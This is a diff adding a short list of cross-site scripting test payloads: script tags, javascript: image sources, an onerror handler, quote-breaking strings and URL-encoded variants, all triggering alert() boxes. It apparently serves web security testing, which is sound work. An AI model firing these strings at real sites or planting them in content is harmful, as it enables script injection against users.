@@ -1,0 +1,24 @@
+<script>alert(123);</script>
+<ScRipT>alert("XSS");</ScRipT>
+<script>alert(123)</script>
+<script>alert("hellox worldss");</script>
+<script>alert(“XSS”)</script> 
+<script>alert(“XSS”);</script>
+<script>alert(‘XSS’)</script>
+“><script>alert(“XSS”)</script>
+<script>alert(/XSS”)</script>
+<script>alert(/XSS/)</script>
+</script><script>alert(1)</script>
+‘; alert(1);
+‘)alert(1);//
+<ScRiPt>alert(1)</sCriPt>
+<IMG SRC=jAVasCrIPt:alert(‘XSS’)>
+<IMG SRC=”javascript:alert(‘XSS’);”>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG SRC=javascript:alert(‘XSS’)>      
+<img src=xss onerror=alert(1)>
+admin
+%3Cimage+src%3D1+href%3D1+onerror%3D%22javascript%3Aalert%281%29%22%3E
+%3Cscript%3Ealert(123);%3C/script%3E
+%3Cscript%3Ealert(123)%3C/script%3E%0D%0A%0A
+%3CScRipT%3Ealert(%22XSS%22);%3C/ScRipT%3E
